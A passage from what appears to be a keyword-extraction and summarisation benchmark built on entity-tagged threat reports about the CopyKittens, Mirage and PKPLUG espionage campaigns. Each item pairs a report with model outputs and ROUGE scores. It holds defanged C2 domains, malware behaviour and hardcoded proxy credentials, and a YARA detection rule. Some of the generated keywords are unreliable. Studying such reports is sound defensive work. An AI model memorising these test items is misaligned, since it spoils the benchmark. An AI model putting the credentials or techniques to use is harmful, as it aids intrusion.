News[.]comgmailtagmanager[.]comfbstatic [WORK_OF_ART] - a[.]xyzfbstatic [WORK_OF_ART] - a[.]spacefbstatic [WORK_OF_ART] - akamaihd[.]comalhadath[.]mobibig [WORK_OF_ART] - windowss[.]comkernel4windows[.]inmicro [WORK_OF_ART] - windows[.]inmywindows24[.]inpatch7 [WORK_OF_ART] - windows[.]compatch8 [WORK_OF_ART] - windows[.]compatchthiswindows[.]comwindows-10patch[.]inwindows [WORK_OF_ART] - drive20[.]com20windows [WORK_OF_ART] - india[.]inwindows [WORK_OF_ART] - kernel[.]inwindows [WORK_OF_ART] - my50[.]comwindows24 [WORK_OF_ART] - kernel[.]inwindowskernel[.]inwindowslayer[.]inwindowssup[.]inwindowsupup[.]commswordupdate15[.]com ( currently sinkholed by Kaspersky)mswordupdate16[.]com ( currently sinkholed by [ORG] Kaspersky)mswordupdate17[.]com ( currently sinkholed by [ORG] Kaspersky)cacheupdate14[.]com ( currently sinkholed by [PERSON] Kaspersky)windowskernel14[.]com ( currently sinkholed by [ORG] Kaspersky)21C2 [ORG] IP [ORG] Addresses", "generated_text": "the PDF; summary; the CopyKittens; mid-level; attacks; the Middle East; 2014; security products; tools; tools; use; social engineering; targets; the infection; email; attachments; targets; the email; the first link; the RAT; Matryoshka; droppers; SCR PE File; a multi-stage framework; a dropper; data exfiltration; the second dropper; a reflective loader; the command; control; data transfer; patches; Figure; server; IP addresses; 2018; the group; indicators; compromise; the Middle East region.", "ref_text": "<START-1>The document analyzes the tactics, techniques, and procedures of a threat actor group named CopyKittens that has been conducting cyberattacks in the Middle East since at least 2015. The group uses spearphishing emails with weaponized Office documents to gain initial access. The documents contain malicious scripts that execute a multi-stage malware framework called Matryoshka. The document explains six key points about this attack cycle: 1. Spear Phishing: The first step in the attack cycle involves sending a spear-phishing email to the target user with a malicious PDF attachment. 2. Droppers Matryoshka: The second step involves dropping a Matryoshka dropper onto the target system. This dropper contains a SCR PE file and a reflective loader component. 3. Reflective Loader: The third step involves injecting the reflective loader into the target system's memory. This component allows the malware to run without being detected by antivirus software. 4. RAT Component: The fourth step involves injecting a remote access tool (RAT) component into the target system. This component provides the attacker with full control over the infected machine. 5. Obfuscation Techniques: To evade detection, the attackers use obfuscation techniques such as runtime API address resolution and substitution ciphers to hide the true functionality of the RAT component. 6. Installation and Persistence: The final step involves installing and persisting the malware on the target system. This includes creating registry keys and task schedules to ensure that the malware remains active even after reboots or system crashes. The malware components show evidence of reusing code from open source projects and online forums. The group constantly evolves the malware to evade detection, adding anti-analysis and obfuscation. Known targets include diplomats, government officials, and academic researchers in the Middle East, especially connected to Israel. The exact actors behind the group are unknown but appears to be mid-level operators reusing public code. Their ongoing development of the mature malware framework continues to make them an effective threat in the region. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.3895582329317269, "gpt3/lexical/rouge_rouge2": 0.10887096774193548, "gpt3/lexical/rouge_rougeL": 0.20080321285140562, "gpt3/lexical/rouge_rougeLsum": 0.20080321285140562, "gpt3_generated_text": ["The article discusses the cyber-attacks conducted by the CopyKittens, a mid-level group, in the Middle East region. The attacks, which began in 2014, are sophisticated and use social engineering methods to deceive targets before infecting their computers. The infection method involves sending infected email attachments, with carefully chosen subjects to match the target's interests. The tools used by the group, including a multi-stage framework called Matryoshka, are bound to each other, making detection difficult. Data exfiltration is performed over the DNS protocol, and the group constantly develops their tools to overcome security products improvements. The article also discusses the group's use of RATs, droppers, reflective loaders, and DNS command and control for data transfer. The group has conducted at least three waves of cyber-attacks, and their targets have included high-ranking diplomats and academic researchers. The article concludes that the CopyKittens will continue to target similar profiles in the future, given their constant striving for improved performance and the current turmoil in the Middle East region."]}, {"split_name": "test", "sample_id": "test_97", "prompt_text": "Extract the keywords: The Mirage CampaignAuthor : [PERSON] Silas [PERSON] Cutler , [ORG] Dell [ORG] SecureWorks [ORG] Counter [ORG] Threat Unit(TM ) Threat Intelli- gence Date : [DATE] 18 [DATE] September [DATE] 2012 URL : url Since [DATE] April [DATE] 2012 , [ORG] the [ORG] Dell [ORG] SecureWorks [ORG] Counter [ORG] Threat [ORG] Unit \u2122 ( CTU ) research team has been tracking a cyber espionage campaign that uses a remote access trojan ( RAT ) named [ORG] Mirage ( also known as [ORG] MirageFox ) . This ongoing attack has targeted a high - profile oil company in the [PRODUCT] Phillipines , a military organization in [GPE] Taiwan , an energy company in [GPE] Canada , and several as yet unidentified entities in [GPE] Brazil , [GPE] Israel , [GPE] Egypt and [GPE] Nigeria . Based on the data collected by the CTU research team , the campaign 's primary attack vector is spearphishing email that targets mid - level to senior - level executives . These emails contain an attachment that includes a malicious payload that installs a copy of [ORG] Mirage . CTU researchers have identified several files that drop and execute a copy of [ORG] Mirage onto a target system . These \" droppers \" are designed to look and behave like [ORG] PDF docu- ments . However , the droppers are stand - alone executable files that open an embedded [ORG] PDF file and execute the [ORG] Mirage trojan . In [CARDINAL] one example , CTU researchers observed an drops a copy of [ORG] Mirage and opens an embedded [ORG] PDF of a news story titled \" [NORP] Yemeni Women can participate in politics just like men , says President [PERSON] Saleh \" that was posted on [ORG] the [ORG] Yemen Observer 's website . Behavior analysis The CTU research team has identified [CARDINAL] two main variants of the [ORG] Mirage trojan . These variants are based on key evolutionary differences in the execution and encodings used in communication with the command and control ( C2 ) servers . When [ORG] Mirage executes , the original file copies itself to a folder under C:\\Documents and Settings\\<USER>\\ or C:\\Windows\\ and then deletes the original file . After the ini- tial copy , [ORG] Mirage starts the newly created file and exits the original . The newly started copy creates registry keys to ensure that the system remains infected after every reboot . CTU researchers have observed the following filenames created after execution : svchost.exe MSN.exePhone - home and [CARDINAL] C2 operations The data sent by [ORG] Mirage shares attributes with the malware family known as JKDDOS , which was researched by [ORG] Arbor [ORG] Networks . In its initial phone - home connection , [PERSON] JKD- [PERSON] DOS sends a system profile to the C2 server . This profile contains the CPU speed , mem- ory size , system name and username . Similar information and encoding techniques are seen in the initial phone - home requests of [ORG] Mirage infections . [ORG] Mirage phones home to its [CARDINAL] C2 servers using a standard HTTP request . From the activity CTU researchers have observed when executing [ORG] Mirage in a malware sandbox , this communication commonly occurs over ports [CARDINAL] 80 , [CARDINAL] 443 and 8080 , and it can implement [ORG] SSL for added security . The earliest variant of [ORG] Mirage uses an [ORG] HTTP [ORG] POST request to transmit the initial phone- home request . This phone - home request contains detailed system information of the in- fected system to give the C2 server a rough profile of each system that is infected and that is calling home . Figure [CARDINAL] 1 . Phone - home request ( variant [CARDINAL] 1 ) . The payload is encoded with a simple cipher to mask the data being sent to the C2 serv- er . The cipher encodes the payload by adding each character 's [ORG] ASCII value by its offset from the start of the payload . Raw values 0x4d 0x69 0x72 [CARDINAL] 0x61 [CARDINAL] 0x67 0x65 Encoded decimal [CARDINAL] 77 0x4d 0x6a 0x74 [CARDINAL] 0x64 0x6b 0x6a [NORP] Encoded values M j105 107rtagejTable 1 . Payload encoding . The initial payload starts with the word \" [ORG] Mirage \" , which in its encoded state is \" Mjtdkj \" . From there , [ORG] Mirage encodes and sends the [ORG] MAC address , CPU information , system name and username in the initial request to the C2 server . If the C2 server successfully receives the request , then it responds with an HTTP re- sponse code \" [CARDINAL] 200 OK \" . The word \" [ORG] Mirage \" appears in its payload , followed by [CARDINAL] two null bytes . If there is no response or an invalid response from the [CARDINAL] C2 server , the infected sys- tem continues to send its initial phone - home request at regular intervals . Figure [CARDINAL] 2 . Decoded payload ( variant [CARDINAL] 1 ) . If the infected system connects successfully to the [CARDINAL] C2 server , then the infected system continues to send regular check - in updates . These updates are transmitted the same way as the initial phone - home request ; however , only the [ORG] MAC address of the infectedsystem is sent in the payload . Figure [CARDINAL] 3 . Decoded check - in update ( variant [CARDINAL] 1 ) . The [ORDINAL] second variant of [ORG] Mirage uses HTTP GET requests instead of [ORG] HTTP [ORG] POST requests to transmit the phone - home requests ' payload . This evolved variant 's initial phone- home request 's payload is contained in a Base64 - encoded string in the initial request . The decoded [PERSON] Base64 payload contains a [ORDINAL] second level of encoding that has several varia- tions . The data being transmitted in the encoded string contains the same data as the previous variant , as well as some additional data . [CARDINAL] One change is the text at the begin- ning of the phone - home payload . Instead of the word \" [ORG] Mirage \" used in earlier variants , later variants use the phrase \" Neo , welcome to the desert of the real \" , a quote from the movie The [ORG] Matrix . Figure [CARDINAL] 4 . Sample request ( variant [CARDINAL] 2 ) . The CTU research team has seen the encoding used in variant [CARDINAL] 2 in other malware fami- lies . [CARDINAL] One such malware family is [PERSON] Lingbo , which uses a similar encoding algorithm but does not contain some of the major characteristics of [ORG] Mirage . Samples from both mal- ware families have included strange embedded quotes . Instead of [ORG] Mirage 's quote fromThe Matrix , [PERSON] Lingbo contains the embedded quote \" It is the end of the world and I feel Fine \" , from the REM song \" It 's the end of the world . \" Custom versions and variants The CTU research team identified several [ORG] Mirage variants that had unique attributes not designed for widespread targeting . These custom variants were designed to operate un- der specific conditions and to evade common system defenses . CTU researchers also found several samples that contained debugging information , possibly from early ver- sions . [CARDINAL] One of the variants was seen in a subset of samples that had been modified specifically for the environment targeted by the threat actors . These samples had been configured with default credentials for the targeted environment 's web proxy servers . The follow- ing proxy usernames and password combinations appear in the samples collected by the CTU research team : a1 : a1 pagmb : pa quickheal : quickhealIn the debugging versions , the CTU research team discovered [CARDINAL] two strings that identified the source code paths from which the samples were compiled : D:\\ \\MF - v1.2\\Server\\Debug\\Server.pdb ( MD5 hash fa26f410d0133f4152ea78d- f3978c22 ) E:\\fox_1.2 [CARDINAL] 20110307\\MF - v1.2\\Server\\Release\\MirageFox_Server.pdb ( MD5 hash debugging versions coincides with the samples for [ORG] Mirage , which were written using [ORG] Microsoft [ORG] Visual [ORG] C++ . CTU researchers also noted that the original name of the trojan used in the path is [ORG] MirageFox , which is likely the name used by the threat actors . This information leads to [CARDINAL] two potential conclusions:1 . The [CARDINAL] two variants of MF - v1.2 , the debug version and the release version , allow the threat actors to customize variants . CTU researchers have already seen this activity . [CARDINAL] 2 . The use of different drive letters but similar source code paths may indicate thatthe threat actors are keeping a repository of tools on a central file server for shared use . Identification of victims From [DATE] May to the date of this publication , the CTU research team engaged in a sinkhol- ing operation . During the operation , several of the domains formerly used as part of the C2 infrastructure were taken over , and all activity to the domains was logged . The sink- holed domains were no longer in use and were freely available for registration . During the operation , CTU researchers were able to identify approximately 80 IP ad- dresses regularly communicating to the sinkhole . After analyzing and decoding the re- quests , CTU researchers discovered that a subset of the observed systems had user- names such as \" admin \" or \" owner \" , and the originating [ORG] IP address resolved to either a residence or an antivirus or security company . Because these requests were most likely from behavioral testing on the malware sample , the CTU research team filtered these connections out of the results . After decoding the inbound requests , the CTU research team identified [CARDINAL] approximately 100 - 120 infected systems attempting to phone home . The majority of the inbound re- quests came from [GPE] Taiwan or the [GPE] Philippines , with several isolated cases in [GPE] Nigeria , [GPE] Brazil , [GPE] Israel , [GPE] Canada and [GPE] Egypt . Many of the [ORG] IP addresses originate from networks owned by the oil company , energy company , and military organization . Deeper analysis of the phone - home requests and correlation with social networking sites allowed CTU researchers to identify a specific individual infected with [ORG] Mirage . It was an executive - level finance manager of the [ORG] Phillipine - based oil company . Figure [CARDINAL] 5 . Sources of infected hosts . Threat actors The threat actors using [ORG] Mirage have employed several tactics to attempt to hide their identities and their primary C2 servers . [CARDINAL] One of the common tactics is using dynamic do- main name system ( dDNS ) domains for the callbacks to the [CARDINAL] C2 servers . dDNS providers ( e.g. , [ORG] Dyndns.com ) allow anyone to register for a free [ORDINAL] third - level domain ( e.g. , Checkip.- dyndns.org ) and require only a valid email address , which is kept private . When investigating the [ORG] DNS addresses of the [CARDINAL] C2 servers , CTU researchers identified several [ORG] IP addresses of hosting companies based in [GPE] the [GPE] United [GPE] States that are running [ORG] HTran . [ORG] HTran software is used to proxy connections from [CARDINAL] one system to another . In the past , it has been used to disguise the true C2 servers used by malware authors . In the CTU research team 's [DATE] 2011 analysis of [ORG] HTran , the software 's author was identified as a member of the [NORP] Chinese hacker group [ORG] HUC , [ORG] the [ORG] Honker [ORG] Union [ORG] of [ORG] China . Despite efforts to operate anonymously , there were several clues that pointed to the true identities of the attackers . During an analysis of the phone - home activity , CTU re- searchers identified [CARDINAL] four unique [ORDINAL] second - level domains that were not connected to a dDNS provider . [CARDINAL] Two of these domains shared a common owner 's email address , and [CARDINAL] two were previously flagged for suspicious activity.nie minC2 domain name [ORG] Owner name [ORG] Owner email [ORG] Adobesuit.com antivirusbar.org white jacks [ORG] Echosky.biz India-videoer.com [GPE] india videoer king@hotmail.com Asia-online.usdnsjacks@yahoo.com [ORDINAL] dnsjacks@yahoo.comtawnya grilth jeno_1980@hotmail.combkpathakking_public@hotmail.com / kings@hotmail.comTable [CARDINAL] 2 . Unique [ORDINAL] second - level domains . CTU researchers correlated 86 % of the [ORG] IP addresses the dDNS domains used in the phone - home request to [ORG] IP addresses of subdomains belonging to domains owned by dnsjacks@yahoo.com . Of [PERCENT] the [PERCENT] remaining 14 % that were not directly associated , CTU re - searchers correlated 10 % to [ORG] IP ranges that resolved to subdomains owned by dnsjacks@yahoo.com . Figure [CARDINAL] 6 . Analysis of [ORG] IP addresses . ( Source : Dell SecureWorks ) This link between the [ORG] IP addresses and the subdomains indicates that dnsjacks@yahoo.- com owns the dDNS domains . Using historical [ORG] DNS records , CTU researchers were able to map each of the dDNS domains to a subdomain of a domain owned by dnsjacks@ya- hoo.com . Figure [CARDINAL] 7 . Details of [ORG] IP range . In the samples CTU researchers analyzed , the other domains associated with the phone- home activity are [ORG] asia-online.us , india-videoer.com and [ORG] Echosky.biz . The CTU research team previously flagged these domains in the [ORG] HTran investigation and later in the Sin Digoo analysis . The analysis of the [ORG] Sin [ORG] Digoo affair indicated that jeno_1980@hotmail.- com and king@hotmail.com were connected . From the data the CTU research team has collected , indications point to dnsjacks@yahoo.com being either another alias or an asso- ciate of the actor referenced in the [ORG] HTran and [ORG] Sin [ORG] Digoo analyses . Figure [CARDINAL] 8 . A common phone number was found to link india-videoer.com and [ORG] asia-online.us [ORG] Conclusion [ORG] Mirage represents [CARDINAL] only [CARDINAL] one small piece of malware involved in an ongoing worldwide campaign . Over [DATE] the [DATE] past [DATE] few [DATE] years , these campaigns have become extremely successful , and a great deal of intellectual property and company secrets has been stolen from the targeted companies . For companies in the targeted industries , it is important to have a strong perimeter secu- rity line in place . Using active intrusion detection and prevention systems as well as [ORG] DNS monitoring for malicious domains is essential to detecting this activity . Companies that use the [GPE] Yara malware identification and classification tool for scanning local sys- tems can use the rules provided in the appendix to search for potential infections . Traditionally , the success of botnets created by threat actor groups has been measured by the quantity of infected systems and the difficulty to defend against in the long term . These targeted attacks show that a successful campaign requires only a small quantity of infected systems to accomplish the attackers ' objectives and to yield extremely power - ful results . [PERSON] Appendix [PERSON] Yara rulesrule [ORG] Mirage_APT_Backdoor : [ORG] APT [ORG] Mirage [ORG] Backdoor [ORG] Rat [ORG] MirageRat author = \" [PERSON] Silas [PERSON] Cutler ( SCutler@SecureWorks.\u2010 com ) \" version = \" [CARDINAL] 1.0 \" description = \" [PERSON] Malware related to [ORG] APT cam\u2010 paign \" type = \" [ORG] APT [ORG] Trojan / [ORG] RAT [ORG] / [ORG] Backdoor \" strings : $ a1 = \" welcome to the desert of the real \" $ a2 = \" [ORG] Mirage \" $ b = \" Encoding : gzip \" $ c = /\\/[A - Za - z]*\\?hl = en/ condition : ( ( $ a1 or $ [MONEY] a2 ) or $ b ) and $ c", "generated_text": "a cyber espionage campaign; a remote access trojan; MirageFox; a high-profile oil company; Philippine; Taiwan; energy company; Canada; Brazil; Israel; Egypt; Nigeria; the campaign; spearphishing emails; attachments; malicious payloads; a copy; PDF; persistence; a new file; registry keys; every reboot; data; JKDDOS; variations; the C2 server; commands; C2 operations; commands; browser; sandboxes; cchost.exe; MSN.exe; commands; initial phone-home requests; values; a detailed system profile; each system; name; username; the infected system; the C2 server; a rough profile; each system; call; ShellMail; data; Compromise; a RAT; domains; aphishing emails; screen; url; the campaign; activity.", "ref_text": "<START-1>The Mirage Campaign is a report by Dell SecureWorks detailing an ongoing cyber espionage operation that uses a remote access trojan (RAT) called Mirage or MirageFox. The campaign has targeted high-profile companies in the energy, oil, and military sectors across the Philippines, Taiwan, Canada, Brazil, Israel, Egypt and Nigeria since April 2012. The primary attack vector is spearphishing emails containing malware that installs Mirage. The emails target mid to senior level executives and pretend to be legitimate attachments like PDFs. Once executed, Mirage copies itself to system folders, creates registry keys for persistence, and phones home to command and control servers for further instructions. It collects system information like MAC address, CPU details, usernames etc. and encodes it before sending. Researchers identified two main variants that differ in their HTTP requests and payloads encoding. Custom versions were found with hardcoded credentials for specific targeted environments. Debugging artifacts point to the malware being developed as 'MirageFox' and kept in a central repository. Sinkholing domains revealed around 100-120 infected hosts across the targeted countries, including an executive level victim at the Philippine oil company. While the attackers use dynamic DNS and hosting in the US to hide their identities, overlaps between IP addresses, domains, and emails point to an actor tracked previously in the HTran and Sin Digoo cases. The campaign shows that only a small number of infections are needed to successfully steal intellectual property and secrets from targeted companies. Recommended defenses include strong perimeter security, intrusion detection, DNS monitoring, and scanning for known indicators of Mirage. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5062034739454094, "gpt3/lexical/rouge_rouge2": 0.20448877805486282, "gpt3/lexical/rouge_rougeL": 0.3325062034739454, "gpt3/lexical/rouge_rougeLsum": 0.3325062034739454, "gpt3_generated_text": ["The article discusses a cyber espionage campaign using a remote access trojan called Mirage, also known as MirageFox. The campaign has targeted a high-profile oil company in the Philippines, a military organization in Taiwan, an energy company in Canada, and entities in Brazil, Israel, Egypt, and Nigeria. The primary attack vector is spearphishing emails with malicious attachments that install Mirage. The trojan creates persistence on the system by copying itself to specific folders and creating registry keys. Mirage communicates with command and control servers using HTTP requests over ports 80, 443, and 8080, implementing SSL for security. The trojan sends system information to the C2 server, and if successful, receives a response code \"200 OK\". Regular check-ins are sent with updates, including the MAC address of the infected system. The article provides insight into the behavior and communication of Mirage in compromising systems."]}, {"split_name": "test", "sample_id": "test_98", "prompt_text": "Extract the keywords: PKPLUG : [ORG] Chinese [ORG] Cyber [ORG] Espionage [ORG] Group [ORG] Attacking [ORG] Asiaunit42.paloaltonetworks.com/pkplug_chinese_cyber_espionage_group_attacking_asiaBy Alex HinchliffeOctober 3 , 2019Executive Summary For [DATE] three [DATE] years , Unit 42 has tracked a set of cyber espionage attack campaigns across [LOC] Asia , which used a mix of publicly available and custom malware . Unit [CARDINAL] 42 created the moniker \u201c PKPLUG \u201d for the threat actor group , or groups , behind these and other documented attacks referenced later in this report . We say group or groups as our current visibility does n\u2019t allow us to determine with high con\ufb01dence if this is the work of [CARDINAL] one group , or [CARDINAL] more [CARDINAL] than [CARDINAL] one group which uses the same tools and has the same tasking . The name comes from the tactic of delivering PlugX malware inside ZIP archive \ufb01les as part of a [ORG] DLL side - loading package . The [ORG] ZIP \ufb01le format contains the [ORG] ASCII magic - bytes \u201c PK \u201d in its header , hence PKPLUG.While tracking these attackers , Unit 42 discovered additional , mostly custom malware families being used by PKPLUG beyond that of just PlugX. The additional payloads include [ORG] HenBox , an [ORG] Android app , and [PERSON] Farseer , a Windows backdoor . The attackers also use the [DATE] 9002 Trojan , which is believed to be shared among a small subset of attack groups . Other publicly available malware seen in relation to PKPLUG activity includes [ORG] Poison Ivy and Zupdax . During our investigations and research into these attacks , we were able to relate previous attacks documented by others that date back as far back as [DATE] six [DATE] years [DATE] ago . Unit [CARDINAL] 42 incorporates these \ufb01ndings , together with our own , under the moniker PKPLUG and continue to track accordingly . It \u2019s not entirely clear as to the ultimate objectives of [ORG] PKPLUG , but installing backdoor [GPE] Trojan implants on victim systems , including mobile devices , infers tracking victims and gathering information is a key goal.url [ORG] Chinese [ORG] Cyber [ORG] Espionage [ORG] Group [ORG] Attacking [ORG] AsiaWe believe victims lay mainly in and around the [LOC] Southeast [LOC] Asia region , particularly [GPE] Myanmar , [GPE] Taiwan , [GPE] Vietnam , and [GPE] Indonesia ; and likely also in various other areas in [LOC] Asia , such as [GPE] Tibet , [GPE] Xinjiang , and Mongolia . Based on targeting , content in some of the malware and ties to infrastructure previously documented publicly as being linked to [NORP] Chinese nation - state adversaries , Unit [CARDINAL] 42 believes with high con\ufb01dence that [ORG] PKPLUG has similar origins . [PERSON] Targeting [PERSON] Based on our visibility into PKPLUG \u2019s campaigns and what we \u2019ve learned from collaborating with industry partners , we believe victims lay mainly in and around the [LOC] Southeast [LOC] Asia region . Speci\ufb01cally , the target countries / provinces include ( with higher con\ufb01dence ) , [GPE] Myanmar and [GPE] Taiwan as well as ( with lower con\ufb01dence ) , [GPE] Vietnam and [GPE] Indonesia . Other areas in [LOC] Asia targeted include [GPE] Mongolia , [GPE] Tibet and [GPE] Xinjiang . This blog , and the associated [PERSON] Adversary [PERSON] Playbook , provides further details including : the methods used for malware delivery , the social engineering topics of decoy applications and documents and [ORG] the [ORG] Command [ORG] & [ORG] Control ( C2 ) infrastructure themes . [GPE] Indonesia , [GPE] Myanmar and [GPE] Vietnam are [ORG] ASEAN members , contributing towards intergovernmental cooperation in the region . Mongolia , speci\ufb01cally the independent country also known as [PERSON] Outer [PERSON] Mongolia , has a long - standing and complex relationship with the [GPE] PRC . [GPE] Tibet and [GPE] Xinjiang are autonomous regions ( AR ) of [GPE] China that tend to be classi\ufb01ed by [GPE] China \u2019s ethnic minorities , granted the ability to govern themselves but ultimately answering to [GPE] the People \u2019s [GPE] Republic [GPE] of [GPE] China ( [GPE] PRC ) . [GPE] Tibet and [GPE] Xinjiang are the only ARs , from \ufb01ve , where the ethnic group maintains a majority over other populations . Most , if not all , of the [CARDINAL] seven countries or regions , are involved in some way with Beijing \u2019s [FAC] Belt and Road Initiative ( BRI ) designed to connect [CARDINAL] 71 countries across [LOC] Southeast [LOC] Asia to [LOC] Eastern [LOC] Europe and [LOC] Africa . The path through [GPE] Xinjiang is especially important to the BRI \u2019s success , but is more often heard of due to con\ufb02icts between the [NORP] Chinese government and the ethnic [LOC] Uyghur population . News of the [ORG] BRI is peppered with stories of success and failure , of countries for and against the [ORG] BRI and of countries pulling out of existing [ORG] BRI projects . Further tensions in the region are attributed to ownership claims over [LOC] the [LOC] South [LOC] China [LOC] Sea , including \ufb01shing quotas and the yet unproven oil and gas reserves . [CARDINAL] At [CARDINAL] least [CARDINAL] three of the target countries mentioned ( [GPE] Malaysia , [GPE] Taiwan and [GPE] Vietnam ) have laid claim to parts of these waters , and some use the area for the vast majority of their trade . Foriegn militaries also patrol , attempting to keep the area open . [GPE] Taiwan , which is n\u2019t an [ORG] AR and does n\u2019t appear to be actively involved with the [ORG] BRI , has its own long - standing history with the [GPE] PRC \u2014 a recent $ 2.2 [MONEY] billion arms sale with the [GPE] U.S. may Before continuing , it \u2019s worth highlighting our research and others relating to the intrusion set that we refer to as PKPLUG . This section documents prior work surrounding cyber attacks relating to PKPLUG . The following \ufb01gure illustrates the chronological order of the publications \u2014 highlighting some key \ufb01ndings from each.url Chinese [ORG] Cyber [ORG] Espionage [ORG] Group Attacking AsiaAs you can see from the timeline , PKPLUG has been active for [DATE] six [DATE] years or more with a variety of targets and methods of delivery and compromise . Figure [CARDINAL] 1 . Timeline of publications and key \ufb01ndings relating to PKPLUGPlease note : the dates shown on the horizontal timeline bar in Figure [CARDINAL] 1 above relate to the publishing date , not the campaign dates , although some were fairly close together . As an example to illustrate the difference in dates , [ORG] HenBox was discovered in [DATE] 2018 but has samples ranging from [DATE] 2015 through to [DATE] this [DATE] week . PlugX and [ORG] Poison Ivy are still doing the rounds and their use by different groups is well known . Whether they relate to [ORG] PKPLUG is another matter.#1 : In [DATE] November [DATE] 2013 , [PERSON] Blue [PERSON] Coat [PERSON] Labs published a report describing a case of attacks against [NORP] Mongolian targets using [LOC] PlugX malware . Like so many other attacks using [ORG] PlugX over [DATE] the [DATE] past [DATE] decade or more , [PRODUCT] Blue [PRODUCT] Coat noted the [ORG] DLL side - loading technique used to launch the malicious payload via legitimate , signed applications . Their report also documented the group \u2019s use of an exploit against software vulnerabilities in [ORG] Microsoft [ORG] Of\ufb01ce . In this case , using a weaponized Word document saved as [PRODUCT] a [PRODUCT] Single [PRODUCT] File [PRODUCT] Web [PRODUCT] Page format \u2014 usually having an mht \ufb01le extension \u2014 in order to exploit CVE-2012 - 0158 to drop and execute a signed WinRAR SFX archive containing the side - loading package and PlugX payload . Considering all the malware related to PKPLUG that Unit 42 has analyzed , the use of such exploits appears to be less common than a spear- phishing technique making use of social engineering to lure victims into running their malware.#2 : A report published in [DATE] April [DATE] 2016 by [ORG] Arbor [ORG] Networks detailed recent cyber attacks using [ORG] Poison Ivy malware against targets in [GPE] Myanmar and other countries in [LOC] Asia over [DATE] the [DATE] previous [DATE] twelve [DATE] months . They noted phishing emails using [ORG] ASEAN membership , economics and democracy - related topics to weaponize documents delivering the [ORG] Poison Ivy payloads . While [ORG] Arbor did n\u2019t know the exact victims , they inferred suspect targets based on the content of emails and associated malware . [ORG] DLL side - loading was also mentioned as the method to install the malware.#3 : Unit [CARDINAL] 42 published research that reported attacks using the [DATE] 9002 Trojan delivered through [FAC] Google [FAC] Drive . The download originated with a spear - phishing email containing a shortened URL that redirected multiple times before downloading a ZIP \ufb01le hosted on [FAC] Google [FAC] Drive . Theurl [NORP] Chinese Cyber Espionage Group Attacking Asiaredirection using HTTP also contains information about the victim who received the spear - phish and clicked the link . In this case , the information related to a well - known politician and human rights activist in [GPE] Myanmar . The \ufb01lename of the ZIP archive also related to initiatives in the country , as did the decoy document contents . The [ORG] ZIP \ufb01le contained a [ORG] DLL side - loading package abusing a Real Player executable signed by RealNetworks , [ORG] Inc. in order to load the [DATE] 9002 payload.#4 : In [DATE] March [DATE] 2017 , researchers published a report in [LANGUAGE] Japanese ( later translated into [LANGUAGE] English ) that described attacks seen by VKRL \u2014 a [GPE] Hong [GPE] Kong - based cybersecurity company \u2014 that were using spear - phishing emails with URLs using [ORG] GeoCities [ORG] Japan to deliver malware . The content of the website contained encoded [ORG] VBScript that executed [ORG] PowerShell commands to download a Microsoft Word document from the same [ORG] GeoCities site , as well as another encoded [ORG] PowerShell script closely resembling [ORG] PowerSploit \u2014 a [ORG] PowerShell post - exploitation framework for pentesters that \u2019s available on [PERSON] GitHub \u2014 that was responsible for decoding and launching a [ORG] Poison Ivy payload . Another [ORG] GeoCities account was found hosting similar packages , including [CARDINAL] one targeting Mongolia based on the contents of the decoy documents . The contents of the \ufb01le , assuming a victim clicked on the URL in the spear - phishing email , resembles the structure used in a technique known as [ORG] AppLocker [ORG] Bypass whereby trusted Windows executables can be used to execute malicious payloads.#5 : In [DATE] early [DATE] 2018 , Unit [CARDINAL] 42 discovered a new [ORG] Android malware family that we named \u201c HenBox \u201d and is tracking over 400 related samples dating back as far as late 2015 , and continuing to present day . HenBox often masquerades as legitimate [ORG] Android apps and appears to primarily target the [ORG] Uyghurs \u2014 a minority [ORG] Turkic ethnic group that is primarily [NORP] Muslim and lives mainly in the Xinjiang Uyghur Autonomous Region in [LOC] Northwest [LOC] China and also targets devices made by [NORP] Chinese manufacturer Xiaomi . Smartphones are the dominant form of internet access in the region and hence make good targets for such malware . Once installed , HenBox steals information from a myriad of sources on the device including harvesting outgoing phone calls to numbers with an \u201c +86 \u201d pre\ufb01x \u2014 the country code for the [GPE] PRC \u2014 and accessing the device microphone and cameras . During investigations , data revealed an older version of [ORG] HenBox had been downloaded from the uyghurapps[.]net website , which appears to be [ORDINAL] third - party [ORG] Android app store serving the [ORG] Uyghur community based on the domain name , language of the site and app content hosted . HenBox was masquerading as an another app \u2014 DroidVPN \u2014 which was also embedded within [ORG] HenBox and installed post - infection.#6 : Based on further investigations and pivoting around HenBox infrastructure , Unit [CARDINAL] 42 discovered a previously - unknown Windows backdoor [PERSON] Trojan called [PERSON] Farseer . [PERSON] Farseer also uses the [ORG] DLL side- loading technique to install payloads \u2014 this time favoring a signed [ORG] Microsoft executable from [ORG] VisualStudio to appear benign . A [ORG] VBScript component is used , via a registry persistence hook , to launch the [ORG] Microsoft executable and the [PERSON] Farseer payload during the user login process . In earlier [PERSON] Farseer variants , we saw decoy documents being used , including [CARDINAL] one case of a [ORG] PDF containing a news article relating to [GPE] Myanmar . Mongolia also appears to be a target based on telemetry provided by an industry partner of ours.url [ORG] Chinese [ORG] Cyber [ORG] Espionage [ORG] Group [ORG] Attacking AsiaFurther information relating to these publications , together with respective Indicators of Compromise ( IoC ) and [ORG] Tactics , Techniques and Procedures ( TTPs ) used , are available in the PKPLUG Adversary Playbook . Tying It All Together The following [PERSON] Maltego image shows the vast majority of known infrastructure and some of the known malware samples related to PKPLUG , and the chart continues to grow as we discover more about this adversary . The indexed shapes that overlay the \ufb01gure provide a reference back to the published work chronology mentioned above.url [ORG] Chinese [ORG] Cyber [ORG] Espionage [ORG] Group [ORG] Attacking [ORG] AsiaFigure [ORG] 2 . PKPLUG Maltego diagram highlighting published researchOverlaps between the different campaigns documented , and the malware families used in them , exist both in infrastructure ( domain names and [ORG] IP addresses being reused , sometimes in multiple cases ) and in terms of malicious traits ( program runtime behaviors or static code characteristics are also where relationships can be found or strengthened).Figure [CARDINAL] 3 below shows a very simpli\ufb01ed view of the [CARDINAL] six core publications again , as per Figure [CARDINAL] 2 above , but with trimmed - down infrastructure to highlight some of the core overlaps.url Chinese [ORG] Cyber [ORG] Espionage [ORG] Group [ORG] Attacking [ORG] AsiaFigure [CARDINAL] 3 . [ORG] Simpli\ufb01ed [ORG] Maltego diagram showing high - level tiesThe [CARDINAL] C2 infrastructure blogged by [PERSON] Blue [PERSON] Coat [PERSON] Labs in their publication ( # [MONEY] 1 ) \u201c PlugX used against [NORP] Mongolian targets \u201d included [ORG] ppt.bodologetee[.]com has infrastructure ties 